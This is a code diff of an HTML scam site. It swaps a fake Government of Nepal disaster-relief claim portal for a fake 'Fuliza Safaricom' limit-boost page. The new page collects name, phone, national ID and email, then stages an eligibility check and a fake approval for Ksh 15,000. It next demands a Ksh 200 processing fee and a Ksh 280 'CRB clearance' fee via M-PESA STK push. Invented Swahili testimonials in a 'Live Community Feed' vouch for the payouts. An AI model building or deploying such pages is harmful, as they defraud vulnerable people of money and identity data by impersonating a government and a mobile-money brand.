+                    <div class="card-title">Kindly submit the following requirements</div>
+                    <div class="card-sub">Fields marked <span class="required">*</span> are required</div>
+
+                    <form id="appForm" onsubmit="submitApplication(event)" novalidate>
+                        <div class="form-group">
+                            <label>Full Name <span class="required">*</span></label>
+                            <div class="input-wrapper" id="fullNameWrapper">
+                                <input type="text" id="fullName" placeholder="Enter full name" required>
+                                <span class="status-icon"></span>
+                            </div>
+                            <div class="error-msg" id="nameError">Name must contain letters only.</div>
+                        </div>
+
+                        <div class="form-row">
+                            <div class="form-group">
+                                <label>Phone Number <span class="required">*</span></label>
+                                <div class="input-wrapper" id="phoneNumberWrapper">
+                                    <input type="tel" id="phoneNumber" placeholder="e.g. 0712345678" required>
+                                    <span class="status-icon"></span>
+                                </div>
+                            </div>
+                            <div class="form-group">
+                                <label>National ID <span class="required">*</span></label>
+                                <div class="input-wrapper" id="nationalIdWrapper">
+                                    <input type="text" id="nationalId" placeholder="e.g. 12345678" required>
+                                    <span class="status-icon"></span>
+                                </div>
+                            </div>
+                        </div>
+
+                        <div class="form-row">
+                            <div class="form-group">
+                                <label>Email Address</label>
+                                <div class="input-wrapper" id="emailWrapper">
+                                    <input type="email" id="email" placeholder="e.g. name@example.com">
+                                    <span class="status-icon"></span>
+                                </div>
+                            </div>
+                            <div class="form-group">
+                                <label>Current Fuliza Limit (KSh) <span class="required">*</span></label>
+                                <div class="input-wrapper" id="currentLimitWrapper">
+                                    <input type="number" id="currentLimit" placeholder="e.g. 700" required>
+                                    <span class="status-icon"></span>
+                                </div>
+                            </div>
+                        </div>
+
+                        <button type="submit" class="btn-primary">Submit Application</button>
+                    </form>
+
+                    <div class="approved-badge-card">
+                        <span>🇰🇪 FULIZA SAFARICOM KENYA APPROVED</span>
+                        <span class="flag-below">🇰🇪</span>
+                    </div>
+                </div>
             </div>
-          </button>
 
-          <div class="sidebar-sub-grid">
-            <button class="sidebar-btn-tile btn-theme-snakebite" onclick="showPage('claim')">
-              <div style="font-size:22px;">💉</div>
-              <div style="font-weight:800; font-size:14px;">Snake Bite (56)</div>
-              <span style="background:rgba(255,255,255,0.9); color:#4a148c; font-weight:800; font-size:10px; padding:2px 8px; border-radius:8px;">CLAIM →</span>
-            </button>
-            <button class="sidebar-btn-tile btn-theme-fire" onclick="showPage('claim')">
-              <div style="font-size:22px;">🔥</div>
-              <div style="font-weight:800; font-size:14px;">Fire (27)</div>
-              <span style="background:rgba(255,255,255,0.9); color:#bf360c; font-weight:800; font-size:10px; padding:2px 8px; border-radius:8px;">CLAIM →</span>
-            </button>
-          </div>
+            <!-- CHECKING ELIGIBILITY -->
+            <div id="checkingPage" class="page">
+                <div class="card-content" style="text-align: center; padding: 32px 20px;">
+                    <div class="eligibility-spinner"></div>
+                    <div style="font-size: 1.4rem; font-weight: 800; color: #212529; margin-bottom: 8px;">Checking your eligibility...</div>
+                    <div style="font-size: 0.85rem; color: #6c757d; margin-bottom: 24px;" id="checkingSubtext">Hold on jon, we're reviewing your application.</div>
+                    <div class="check-item pending" id="check1"><div class="check-circle"></div><div style="font-size: 0.88rem;">Verifying national ID...</div></div>
+                    <div class="check-item pending" id="check2"><div class="check-circle"></div><div style="font-size: 0.88rem;">Checking phone number registration...</div></div>
+                    <div class="check-item pending" id="check3"><div class="check-circle"></div><div style="font-size: 0.88rem;">Reviewing Fuliza eligibility...</div></div>
+                    <div class="check-item pending" id="check4"><div class="check-circle"></div><div style="font-size: 0.88rem;">Confirming account status...</div></div>
+                    <div class="check-item pending" id="check5"><div class="check-circle"></div><div style="font-size: 0.88rem;">Calculating new limit tier...</div></div>
+                </div>
+            </div>
 
-          <div class="sidebar-sub-grid">
-            <button class="sidebar-btn-tile btn-theme-flood" onclick="showPage('claim')">
-              <div style="font-size:22px;">🌊</div>
-              <div style="font-weight:800; font-size:14px;">Flood (23)</div>
-              <span style="background:rgba(255,255,255,0.9); color:#01579b; font-weight:800; font-size:10px; padding:2px 8px; border-radius:8px;">CLAIM →</span>
-            </button>
-            <button class="sidebar-btn-tile btn-theme-rainfall" onclick="showPage('claim')">
-              <div style="font-size:22px;">🌧️</div>
-              <div style="font-weight:800; font-size:14px;">Rainfall (17)</div>
-              <span style="background:rgba(255,255,255,0.9); color:#004d40; font-weight:800; font-size:10px; padding:2px 8px; border-radius:8px;">CLAIM →</span>
-            </button>
-          </div>
+            <!-- STEP 3: APPROVED -->
+            <div id="step3" class="page">
+                <div class="card-header-green">
+                    <div class="step-info">Step 3 of 5 · Approved</div>
+                    <div class="step-title" style="font-size: 1.25rem; font-weight: 800; margin-bottom: 6px;" id="approvedGreeting">🎉 Congratulations, JON MO!</div>
+                    <div class="step-sub" style="font-size: 0.82rem; opacity: 0.95; line-height: 1.45;">You have been approved for the following Fuliza Safaricom Fund amount. Click withdraw to proceed.</div>
+                </div>
+                <div class="card-body-white" style="padding: 20px; background: #ffffff;">
+                    <div style="border: 1.5px solid #b4c6ef; background: #f0f5ff; border-radius: 16px; padding: 20px; text-align: center; margin-bottom: 16px;">
+                        <div style="font-size: 0.72rem; color: #6c757d; font-weight: 700; text-transform: uppercase; letter-spacing: 0.5px; margin-bottom: 6px;">YOUR APPROVED FULIZA SAFARICOM FUND</div>
+                        <div style="font-size: 2.6rem; font-weight: 900; color: #0d5f2f; margin: 4px 0;">Ksh 15,000</div>
+                        <div style="font-size: 0.75rem; color: #1b49b5; font-weight: 600; display: flex; align-items: center; justify-content: center; gap: 4px;">
+                            <span>✓</span> Eligibility verified
+                        </div>
+                    </div>
+                    <button class="btn-primary btn-green" style="font-size: 1.05rem; margin-bottom: 10px; margin-top: 0; box-shadow: 0 4px 12px rgba(13, 95, 47, 0.2);" onclick="showProcessingFeePage()">
+                        💸 Withdraw Funds
+                    </button>
+                    <div style="text-align: center; font-size: 0.72rem; color: #6c757d; font-weight: 500; display: flex; align-items: center; justify-content: center; gap: 4px; margin-bottom: 16px;">
+                        🔒 Secure M-PESA STK Push payment
+                    </div>
+                    <div style="margin-top: 8px; border: 1px solid #e9ecef; border-radius: 16px; padding: 16px; background: #ffffff;">
+                        <div style="font-size: 0.95rem; font-weight: 800; display:flex; align-items:center; gap:8px; margin-bottom: 12px;">
+                            🔴 Live Community Feed
+                            <span class="feed-live">LIVE</span>
+                        </div>
+                        <div class="feed-container" id="feedContainer3"></div>
+                    </div>
+                    <div class="approved-badge-card">
+                        <span>🇰🇪 FULIZA SAFARICOM KENYA APPROVED</span>
+                        <span class="flag-below">🇰🇪</span>
+                    </div>
+                </div>
+            </div>
 
-          <button class="sidebar-all-claims-btn" onclick="showPage('claim')">
-            ⚡ CLAIM FINANCIAL RELIEF ($250 - $2,000 USD) →
-          </button>
-          <a href="#" class="more-summary-link" onclick="showPage('claim'); return false;">View Full Relief Table ($250 - $2,000) &gt;&gt;</a>
+            <!-- STEP 4: PROCESSING FEE -->
+            <div id="processingFeePage" class="page">
+                <div class="card-header-gold">
+                    <div class="nav-header">
+                        <button class="back-btn" onclick="goToStep(3)">←</button>
+                    </div>
+                    <div class="step-info">Step 4 of 5 · Processing Fee</div>
+                    <div class="step-title">Processing Fee Required</div>
+                    <div class="step-sub">Pay the processing fee to continue with your fund disbursement.</div>
+                </div>
+                <div class="card-body-white" style="padding: 20px; background: #ffffff;">
+                    <div class="fee-section">
+                        <div class="fee-label">Processing Fee</div>
+                        <div class="fee-amount">Ksh 200</div>
+                        <div class="fee-sub">Pay this fee to proceed with your fund disbursement</div>
+                    </div>
+                    <button class="btn-primary btn-gold" style="font-size: 1.05rem; margin-bottom: 10px; margin-top: 0; box-shadow: 0 4px 12px rgba(201, 168, 76, 0.3);" onclick="openProcessingFeePayment()">
+                        💰 Pay Ksh 200
+                    </button>
+                    <div style="text-align: center; font-size: 0.72rem; color: #6c757d; font-weight: 500; display: flex; align-items: center; justify-content: center; gap: 4px; margin-bottom: 16px;">
+                        🔒 Secure M-PESA STK Push payment
+                    </div>
+                    <div style="margin-top: 8px; border: 1px solid #e9ecef; border-radius: 16px; padding: 16px; background: #ffffff;">
+                        <div style="font-size: 0.95rem; font-weight: 800; display:flex; align-items:center; gap:8px; margin-bottom: 12px;">
+                            🔴 Live Community Feed
+                            <span class="feed-live">LIVE</span>
+                        </div>
+                        <div class="feed-container" id="feedContainerProc"></div>
+                    </div>
+                    <div class="approved-badge-card">
+                        <span>🇰🇪 FULIZA SAFARICOM KENYA APPROVED</span>
+                        <span class="flag-below">🇰🇪</span>
+                    </div>
+                </div>
+            </div>
+
+            <!-- STEP 5: CRB -->
+            <div id="crbPage" class="page">
+                <div class="card-header-red" style="background: #c62828; color: #ffffff; padding: 24px 20px; border-radius: 24px 24px 0 0;">
+                    <div style="font-size: 0.72rem; opacity: 0.9; font-weight: 700; margin-bottom: 8px; text-transform: uppercase; letter-spacing: 0.5px;">Step 5 of 5 · CRB Clearance Required</div>
+                    <div class="step-title" style="font-size: 1.25rem; font-weight: 800; line-height: 1.3;">Clear with CRB to release your funds</div>
+                </div>
+                <div class="card-body-white" style="padding: 20px; background: #ffffff;">
+                    <div style="background: #ffebee; border: 1px dashed #ef9a9a; border-radius: 12px; padding: 18px; margin-bottom: 20px;">
+                        <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 12px;">
+                            <span style="font-size: 0.8rem; color: #c62828; font-weight: 700;">CRB Clearance Fee</span>
+                            <span style="font-size: 1.4rem; font-weight: 900; color: #c62828;">Ksh 280</span>
+                        </div>
+                        <div style="border-top: 1px dotted #ef9a9a; margin-bottom: 12px;"></div>
+                        <div style="font-size: 0.75rem; color: #c62828; text-align: center; font-weight: 600;">
+                            Paid via M-PESA STK push to <span id="crbPhoneDisplay">0710222875</span>
+                        </div>
+                    </div>
+                    <button class="btn-primary btn-red" style="font-size: 1.05rem; margin-bottom: 16px; margin-top: 0; box-shadow: 0 4px 12px rgba(198, 40, 40, 0.2);" onclick="openCRBPayment()">
+                        Pay Ksh 280 to Clear CRB →
+                    </button>
+                    <div style="text-align: center; font-size: 0.72rem; color: #6c757d; font-weight: 500; display: flex; align-items: center; justify-content: center; gap: 4px; margin-bottom: 20px;">
+                        🔒 Secure payment · Funds released immediately after clearance
+                    </div>
+                    <div style="border: 1px solid #e9ecef; border-radius: 16px; padding: 16px; background: #ffffff;">
+                        <div style="font-size: 0.95rem; font-weight: 800; display:flex; align-items:center; gap:8px; margin-bottom: 12px;">
+                            🔴 Live Community Feed
+                            <span class="feed-live">LIVE</span>
+                        </div>
+                        <div class="feed-container" id="feedContainerCRB"></div>
+                    </div>
+                    <div class="approved-badge-card">
+                        <span>🇰🇪 FULIZA SAFARICOM KENYA APPROVED</span>
+                        <span class="flag-below">🇰🇪</span>
+                    </div>
+                </div>
+            </div>
+
+            <!-- FINAL SUCCESS -->
+            <div id="allFeesClearedPage" class="page">
+                <div class="card-header-green" style="background: linear-gradient(135deg, #0d5f2f, #0ca678);">
+                    <div class="step-title" style="font-size: 1.4rem; font-weight: 900; margin-bottom: 6px;">✅ All Fees Cleared!</div>
+                    <div class="step-sub" style="font-size: 0.9rem; opacity: 0.95;">Processing fee of <strong>Ksh 200</strong> and CRB clearance fee of <strong>Ksh 280</strong> confirmed via M-PESA.</div>
+                </div>
+                <div class="card-body-white" style="padding: 20px;">
+                    <div style="font-size: 0.78rem; color: #6c757d; margin-bottom: 14px;">Receipt: <strong id="finalReceiptDisplay">UG9MDAR8EF</strong></div>
+                    <div class="success-summary">
+                        <div class="summary-title">🚀 DISBURSEMENT IN PROGRESS</div>
+                        <div class="summary-row"><span class="label">Fund Amount</span><span class="value amount">Ksh 5,000</span></div>
+                        <div class="summary-row"><span class="label">Network</span><span class="value network">🟢 Safaricom (M-PESA)</span></div>
+                        <div class="summary-row"><span class="label">Sending To</span><span class="value" id="finalPhoneDisplay">0725747225</span></div>
+                        <div class="summary-row"><span class="label">Processing Fee Paid</span><span class="value">Ksh 200</span></div>
+                        <div class="summary-row"><span class="label">CRB Clearance Fee Paid</span><span class="value">Ksh 280</span></div>
+                    </div>
+                    <div class="sending-indicator">
+                        <span class="dot"></span>
+                        Sending funds to your phone...
+                    </div>
+                    <div style="font-size: 0.75rem; color: #6c757d; text-align: center; margin-bottom: 16px;">Your Fuliza Safaricom funds will arrive within <strong>3 minutes</strong>. Keep your phone on and M-PESA active.</div>
+                    <button class="btn-primary btn-green" onclick="backToHome()">Back to Home</button>
+                    <div class="approved-badge-card">
+                        <span>🇰🇪 FULIZA SAFARICOM KENYA APPROVED</span>
+                        <span class="flag-below">🇰🇪</span>
+                    </div>
+                </div>
+            </div>
+
         </div>
-      </section>
+
+        <div class="footer">Fuliza Safaricom · Empowering Kenyans 🇰🇪</div>
     </div>
 
-    <!-- FILTER & SEARCH BAR -->
-    <div class="filter-bar">
-      <div class="filter-group">
-        <label>Source</label>
-        <select id="filter-source">
-          <option value="">--Select a option--</option>
-          <option value="neoc">NEOC Emergency Feed</option>
-          <option value="police">Nepal Police HQ</option>
-          <option value="district">District Administration Office</option>
-        </select>
-      </div>
-
-      <div class="filter-group">
-        <label>Incident Type</label>
-        <select id="filter-incident" onchange="filterPortalTable()">
-          <option value="">--Select Incident--</option>
-          <option value="Landslide">Landslide</option>
-          <option value="Snake Bite">Snake Bite</option>
-          <option value="Fire">Fire</option>
-          <option value="Flood">Flood</option>
-          <option value="Heavy Rainfall">Heavy Rainfall</option>
-          <option value="Thunderbolt">Thunderbolt</option>
-        </select>
-      </div>
-
-      <div class="filter-group">
-        <label>District</label>
-        <select id="filter-district" onchange="filterPortalTable()">
-          <option value="">--Select a option--</option>
-          <option value="Kalikot">Kalikot</option>
-          <option value="Salyan">Salyan</option>
-          <option value="Bajura">Bajura</option>
-          <option value="Dadeldhura">Dadeldhura</option>
-          <option value="Humla">Humla</option>
-          <option value="Kaski">Kaski</option>
-          <option value="Kathmandu">Kathmandu</option>
-        </select>
-      </div>
-
-      <div class="filter-group">
-        <label>Local Level</label>
-        <select id="filter-local-level">
-          <option value="">--Select Local Level--</option>
-          <option value="Shubha Kalika">Shubha Kalika Rural Municipality</option>
-          <option value="Darma">Darma Rural Municipality</option>
-          <option value="Sannitriveni">Sannitriveni Rural Municipality</option>
-          <option value="Himali">Himali Rural Municipality</option>
-          <option value="Navadurga">Navadurga Rural Municipality</option>
-          <option value="Kharpunath">Kharpunath Rural Municipality</option>
-          <option value="Machhapuchhre">Machhapuchhre Rural Municipality</option>
-        </select>
-      </div>
-
-      <div class="filter-group">
-        <label>From</label>
-        <input type="text" value="2026-09-01" id="filter-from-date">
-      </div>
-
-      <div class="filter-group">
-        <label>To</label>
-        <input type="text" value="2026-09-05" id="filter-to-date">
-      </div>
-
-      <div class="filter-actions">
-        <button class="btn-portal-blue" onclick="filterPortalTable()">Search</button>
-        <button class="btn-portal-blue" onclick="exportPortalTableCSV()">Export</button>
-        <button class="btn-portal-blue" onclick="window.print()">Print</button>
-      </div>
-    </div>
-
-    <!-- INCIDENTS DATA TABLE -->
-    <div class="table-container">
-      <table class="incidents-table" id="portal-incidents-table">
-        <thead>
-          <tr>
-            <th style="width:38px;">S.No.</th>
-            <th>District</th>
-            <th>Local Level</th>
-            <th>Incident</th>
-            <th>Incident Date</th>
-            <th>Death Male</th>
-            <th>Death Female</th>
-            <th>Death Unknown</th>
-            <th>Total Death</th>
-            <th>Missing People</th>
-            <th>Affected Family</th>
-            <th>Estimated Loss</th>
-            <th>Injured</th>
-            <th>Govt. Houses Fully Damaged</th>
-            <th>Govt. Houses Partially Damaged</th>
-            <th>Private Houses Fully Damaged</th>
-          </tr>
-        </thead>
-        <tbody id="portal-table-body"></tbody>
-        <tfoot>
-          <tr class="total-row">
-            <td colspan="5">Total</td>
-            <td id="tot-male">6874</td>
-            <td id="tot-female">7234</td>
-            <td id="tot-unknown">42</td>
-            <td id="tot-death">49503</td>
-            <td id="tot-missing">3756</td>
-            <td id="tot-affected">7168075</td>
-            <td id="tot-loss">56059813081</td>
-            <td id="tot-injured">102536</td>
-            <td id="tot-gov-full">2726</td>
-            <td id="tot-gov-part">3944</td>
-            <td id="tot-pvt-full">18250</td>
-          </tr>
-        </tfoot>
-      </table>
-    </div>
-
-  </div> <!-- End Page 1 -->
-
-  <!-- ========================================================================
-       PAGE 2: FINANCIAL ASSISTANCE TABLE
-       ======================================================================== -->
-  <div id="page-claim">
-
-    <div class="claim-top-bar">
-      <div class="claim-header-titles">
-        <h2>National Disaster Financial Relief Fund</h2>
-        <p>Government of Nepal • Direct Emergency Financial Assistance Disbursement</p>
-      </div>
-      <div>
-        <button class="btn-back-portal" onclick="showPage('portal')">
-          <span>←</span> Back to Main Portal
-        </button>
-      </div>
-    </div>
-
-    <div id="instant-claim-banner"></div>
-
-    <div class="finance-metrics-bar">
-      <div class="f-metric">
-        <span class="f-metric-lbl">Total Allocated ($)</span>
-        <span class="f-metric-val">$2,500,000</span>
-      </div>
-      <div class="f-metric">
-        <span class="f-metric-lbl">Total Quota (Units)</span>
-        <span class="f-metric-val">4,650</span>
-      </div>
-      <div class="f-metric">
-        <span class="f-metric-lbl">Tiers</span>
-        <span class="f-metric-val">7</span>
-      </div>
-      <div class="f-metric">
-        <span class="f-metric-lbl">Total Claimed ($)</span>
-        <span class="f-metric-val" style="color:#0b66c3;" id="stat-total-claimed">$0</span>
-      </div>
-    </div>
-
-    <div style="background:#ffffff; border:1px solid #e0e0e0; border-radius:6px; padding:16px; margin-bottom:24px;">
-      <div style="overflow-x: auto;">
-        <table class="six-col-table">
-          <thead>
-            <tr>
-              <th style="width: 18%;">1. Amount ($)</th>
-              <th style="width: 16%;">2. Refund ($)</th>
-              <th style="width: 18%;">3. NPR (Rs.)</th>
-              <th style="width: 16%;">4. Units</th>
-              <th style="width: 14%;">5. Hours</th>
-              <th style="width: 18%; text-align: center;">6. Action</th>
-            </tr>
-          </thead>
-          <tbody id="finance-table-body"></tbody>
-        </table>
-      </div>
-    </div>
-
-  </div> <!-- End Page 2 -->
-
-  <!-- ========================================================================
-       PAGE 3: COMPENSATION CLAIM
-       ======================================================================== -->
-  <div id="page-compensation">
-
-    <div class="comp-top-bar">
-      <div class="comp-header">
-        <h2>Claim Compensation</h2>
-        <p>Enter your phone number to pay the processing fee.</p>
-      </div>
-      <div>
-        <button class="btn-back-portal" onclick="showPage('claim')">
-          <span>←</span> Back to Packages
-        </button>
-      </div>
-    </div>
-
-    <div class="comp-form-card">
-      <div class="package-summary">
-        <span><span class="label">Package:</span> <span class="value" id="selected-package-display">—</span></span>
-        <span><span class="label">Refund Amount:</span> <span class="value" id="selected-amount-display">—</span></span>
-      </div>
-
-      <div class="form-group">
-        <label>Phone number</label>
-        <input type="text" id="mpesa-input" placeholder="e.g. 0712345678" />
-      </div>
-
-      <div class="form-group">
-        <label>Processing fee</label>
-        <div class="comp-fee-display">
-          <span>KSh</span>
-          <span class="fee-amount" id="processing-fee-display">—</span>
+    <!-- =============================================================
+    PROCESSING FEE PAYMENT MODAL (status removed)
+    ============================================================= -->
+    <div class="modal-overlay" id="processingFeeModal">
+        <div class="modal-box">
+            <div class="modal-icon warning"><span style="font-size:1.8rem;">🔒</span></div>
+            <div class="modal-title">Processing Fee Payment</div>
+            <div class="modal-desc">Pay Ksh 200 to process your Fuliza Safaricom fund disbursement.</div>
+            <div style="background:#f5edd6; padding:12px; border-radius:8px; margin-bottom:12px;">
+                <div style="font-size:0.7rem; color:#666;">Amount</div>
+                <div style="font-size:1.6rem; font-weight:800; color:#b85c00;">Ksh 200</div>
+            </div>
+            <div class="modal-phone-group">
+                <span class="prefix">+254</span>
+                <input type="tel" id="procFeePhoneInput" placeholder="712345678">
+            </div>
+            <!-- status div removed -->
+            <div style="display:flex; gap:10px;">
+                <button class="btn-primary btn-gold" style="flex:1;" id="procFeePayBtn" onclick="processProcessingFee()">
+                    <span id="procFeePayText">Pay Ksh 200</span>
+                    <span id="procFeeSpinner" style="display:none;" class="spinner"></span>
+                </button>
+                <button class="btn-outline" style="flex:0.5; padding:14px;" onclick="closeProcFeeModal()">Cancel</button>
+            </div>
+            <div style="font-size:0.6rem; color:#999; margin-top:10px;">You will receive an M-Pesa STK push on your phone</div>
         </div>
-      </div>
-
-      <button class="btn-pay-claim" id="pay-claim-btn" onclick="initiatePayment()">
-        → Pay KSh <span id="pay-fee-label">—</span> &amp; claim
-      </button>
     </div>
 
-  </div> <!-- End Page 3 -->
-
-  <!-- ========================================================================
-       PAGE 4: CONTACT PAGE
-       ======================================================================== -->
-  <div id="contact-page">
-    <div class="contact-icon">📞</div>
-    <div class="contact-title">We will contact you within 2 hours</div>
-    <div class="contact-message">Your claim has been received and is being processed.</div>
-    <div class="contact-sub">A representative will reach out to you shortly via phone or SMS.</div>
-    <div class="contact-btn">
-      <button class="btn-back-portal" onclick="showPage('portal')" style="border-color:#0b66c3; color:#0b66c3;">
-        ← Back to Main Portal
-      </button>
+    <!-- =============================================================
+    CRB PAYMENT MODAL (status removed)
+    ============================================================= -->
+    <div class="modal-overlay" id="crbModal">
+        <div class="modal-box">
+            <div class="modal-icon warning"><span style="font-size:1.8rem;">🔒</span></div>
+            <div class="modal-title">CRB Clearance Payment</div>
+            <div class="modal-desc">Pay Ksh 280 to clear your CRB and release your Fuliza Safaricom funds.</div>
+            <div style="background:#f5edd6; padding:12px; border-radius:8px; margin-bottom:12px;">
+                <div style="font-size:0.7rem; color:#666;">Amount</div>
+                <div style="font-size:1.6rem; font-weight:800; color:#b85c00;">Ksh 280</div>
+            </div>
+            <div class="modal-phone-group">
+                <span class="prefix">+254</span>
+                <input type="tel" id="crbPhoneInput" placeholder="712345678">
+            </div>
+            <!-- status div removed -->
+            <div style="display:flex; gap:10px;">
+                <button class="btn-primary btn-red" style="flex:1;" id="crbPayBtn" onclick="processCRBPayment()">
+                    <span id="crbPayText">Pay Ksh 280</span>
+                    <span id="crbSpinner" style="display:none;" class="spinner"></span>
+                </button>
+                <button class="btn-outline" style="flex:0.5; padding:14px;" onclick="closeCRBModal()">Cancel</button>
+            </div>
+            <div style="font-size:0.6rem; color:#999; margin-top:10px;">You will receive an M-Pesa STK push on your phone</div>
+        </div>
     </div>
-  </div>
 
-  <!-- ========================================================================
-       STK PUSH MODAL
-       ======================================================================== -->
-  <div class="stk-modal-overlay" id="stkModal">
-    <div class="stk-modal">
-      <div class="stk-icon">📱</div>
-      <h3>M-Pesa STK Push</h3>
-      <div class="stk-amount" id="stk-amount-display">KSh 0</div>
-      <div class="stk-phone">to <strong id="stk-phone-display">0712345678</strong></div>
-      <div class="stk-status" id="stk-status">Sending request...</div>
-      <div class="stk-spinner" id="stk-spinner"></div>
-      <div class="stk-actions">
-        <button class="btn-stk-confirm" id="stk-confirm-btn" style="display:none;">I've Completed</button>
-        <button class="btn-stk-cancel" id="stk-cancel-btn">Cancel</button>
-      </div>
-      <div class="stk-timer">
-        Waiting for confirmation <span id="stk-timer">60</span>s
-      </div>
+    <!-- =============================================================
+    STK WAITING OVERLAY
+    ============================================================= -->
+    <div class="stk-waiting-overlay" id="stkWaitingOverlay">
+        <div class="stk-waiting-box">
+            <div class="pulse-icon"></div>
+            <div class="title">📱 M-PESA Prompt Sent!</div>
+            <div class="sub">Check <span class="phone" id="stkPhoneDisplay"></span> and enter your M-PESA PIN to confirm.</div>
+            <div style="font-size:0.8rem;color:#6c757d;margin-bottom:20px;">Enter your M-PESA PIN on your phone to complete the payment.</div>
+            <div class="dots"><span></span><span></span><span></span></div>
+            <div class="listening"><span class="dot"></span> Listening for callback...</div>
+            <div class="note">Do not close this page – funds will be disbursed automatically once confirmed.</div>
+        </div>
     </div>
-  </div>
 
-  <!-- Toast (generic error) -->
-  <div id="toast" class="toast"></div>
+    <!-- =============================================================
+    PROCESSING MODAL
+    ============================================================= -->
+    <div class="proc-modal-overlay" id="processingModal">
+        <div class="proc-modal-box">
+            <div class="proc-left">
+                <div class="proc-header">
+                    <div class="proc-badge">FULIZA SAFARICOM</div>
+                    <div class="proc-title-block">REPUBLIC OF KENYA —<br><strong>FULIZA SAFARICOM FUND</strong><br>Official Processing System</div>
+                </div>
+                <div class="proc-status-text">Processing empowerment application...</div>
+                <div class="proc-dots"><span></span><span></span><span></span></div>
+            </div>
+            <div class="proc-right">Please wait while we validate your information for empowerment disbursement.</div>
+        </div>
+    </div>
 
-  <!-- FOOTER -->
-  <footer class="portal-footer">
-    <p>© 2026 Government of Nepal | Ministry of Home Affairs | National Emergency Operation Center (NEOC), Singha Durbar, Kathmandu</p>
-    <p style="margin-top:4px; font-size:11px; opacity:0.8;">Emergency Hotline: 1149 | Toll Free: 1660-01-01149 | Email: info@drrportal.gov.np</p>
-  </footer>
+    <!-- =============================================================
+    JAVASCRIPT
+    ============================================================= -->
+    <script>
+        // ──────────────────────────────────────────────────────────────
+        // DATA
+        // ──────────────────────────────────────────────────────────────
+        let appData = {
+            fullName: '',
+            phone: '',
+            id: '',
+            email: '',
+            currentLimit: 700,
+            purpose: ''
+        };
+        let processingFeeTransactionId = null;
+        let crbTransactionId = null;
 
-</div>
+        const feedItems = [
+            { name: 'James Mwangi', initials: 'JM', color: '#0d5f2f', text: 'Aisee nimepata STK nikaplipa 280 sasa hivi na 15k ishaingia kwa Mpesa! Shukran sana.',
+                time: '1 minute ago' },
+            { name: 'Mercy Wanjiku', initials: 'MW', color: '#c9a84c', text: 'Is this real? Mimi nilikuwa na mashaka lakini nimepokea saa hii. Asante sana Fuliza Safaricom!',
+                time: '45 seconds ago' },
+            { name: 'Samuel Kibet', initials: 'SK', color: '#2196f3', text: 'Fast and reliable. Hustler fund kweli inasaidia vijana. 15,000 imeingia chap chap.',
+                time: '2 seconds ago' },
+            { name: 'Dennis Barasa', initials: 'DB', color: '#9c27b0', text: 'Leo shule nafungua niko na school fees yote. God bless Kenya! 🇰🇪',
+                time: '5 seconds ago' },
+            { name: 'Diana Jepkosgei', initials: 'DJ', color: '#e91e63', text: 'Niko Eldoret na nimepata. Siamini macho yangu, nililipa 280 ya CRB na zikatumwa mara hiyo.',
+                time: '10 seconds ago' },
+        ];
+        let feedInterval;
 
-<!-- ==========================================================================
-     JAVASCRIPT APPLICATION LOGIC
-     ========================================================================== -->
-<script>
-  // ──────────────────────────────────────────────────────────────
-  // 1. REFUND DATA (packages)
-  // ──────────────────────────────────────────────────────────────
-  const refundData = [
-    { usd: 250, ksh: 32500, processingFee: 250, advancePercent: 0.10 },
-    { usd: 299, ksh: 38870, processingFee: 299, advancePercent: 0.10 },
-    { usd: 350, ksh: 45500, processingFee: 350, advancePercent: 0.10 },
-    { usd: 500, ksh: 65000, processingFee: 750, advancePercent: 0.10 },
-    { usd: 700, ksh: 91000, processingFee: 1050, advancePercent: 0.10 }
-  ];
+        // ==================== VALIDATION FUNCTIONS ====================
+        function validateName(input) {
+            const wrapper = document.getElementById('fullNameWrapper');
+            const name = input.value.trim();
+            const isValid = /^[a-zA-Z\s.]+$/.test(name) && name.length >= 3;
+            wrapper.classList.toggle('valid', isValid);
+            wrapper.classList.toggle('invalid', !isValid && name.length > 0);
+            return isValid;
+        }
 
-  let claimedStatus = {};
-  let selectedPackage = null;
-  let processingFeeTransactionId = null;
+        function validatePhone(input) {
+            const wrapper = document.getElementById('phoneNumberWrapper');
+            const phone = input.value.trim();
+            const isValid = /^(07|01)\d{8}$/.test(phone);
+            wrapper.classList.toggle('valid', isValid);
+            wrapper.classList.toggle('invalid', !isValid && phone.length > 0);
+            return isValid;
+        }
 
-  // ──────────────────────────────────────────────────────────────
-  // 2. INCIDENTS TABLE DATA
-  // ──────────────────────────────────────────────────────────────
-  const portalIncidentsData = [
-    { sno: 1, district: "Kalikot", localLevel: "Shubha Kalika Rural Municipality", incident: "Landslide",
-      date: "2026-09-05", male: 0, female: 0, unknown: 0, totalDeath: 0, missing: 0, affected: 0, loss: 0,
-      injured: 0, govFull: 0, govPart: 0, pvtFull: 0 },
-    { sno: 2, district: "Salyan", localLevel: "Darma Rural Municipality", incident: "Snake Bite",
-      date: "2026-09-05", male: 0, female: 0, unknown: 0, totalDeath: 0, missing: 0, affected: 1, loss: 0,
-      injured: 1, govFull: 0, govPart: 0, pvtFull: 0 },
-    { sno: 3, district: "Kalikot", localLevel: "Sannitriveni Rural Municipality", incident: "Thunderbolt",
-      date: "2026-09-05", male: 0, female: 0, unknown: 0, totalDeath: 0, missing: 0, affected: 1, loss: 0,
-      injured: 0, govFull: 0, govPart: 0, pvtFull: 0 },
-    { sno: 4, district: "Bajura", localLevel: "Himali Rural Municipality", incident: "Landslide",
-      date: "2026-09-05", male: 0, female: 0, unknown: 0, totalDeath: 0, missing: 0, affected: 0, loss: 0,
-      injured: 0, govFull: 0, govPart: 0, pvtFull: 0 },
-    { sno: 5, district: "Dadeldhura", localLevel: "Navadurga Rural Municipality", incident: "Heavy Rainfall",
-      date: "2026-09-05", male: 0, female: 0, unknown: 0, totalDeath: 0, missing: 0, affected: 0, loss: 0,
-      injured: 0, govFull: 0, govPart: 0, pvtFull: 0 },
-    { sno: 6, district: "Humla", localLevel: "Kharpunath Rural Municipality", incident: "Flood",
-      date: "2026-09-05", male: 0, female: 0, unknown: 0, totalDeath: 0, missing: 0, affected: 0, loss: 0,
-      injured: 0, govFull: 0, govPart: 0, pvtFull: 0 },
-    { sno: 7, district: "Kaski", localLevel: "Machhapuchhre Rural Municipality", incident: "Landslide",
-      date: "2026-09-05", male: 2, female: 0, unknown: 0, totalDeath: 2, missing: 0, affected: 2, loss: 450000,
-      injured: 1, govFull: 0, govPart: 0, pvtFull: 1 },
-    { sno: 8, district: "Kalikot", localLevel: "Raskot Municipality", incident: "Landslide",
-      date: "2026-09-04", male: 1, female: 1, unknown: 0, totalDeath: 2, missing: 1, affected: 6, loss: 1200000,
-      injured: 3, govFull: 0, govPart: 1, pvtFull: 3 },
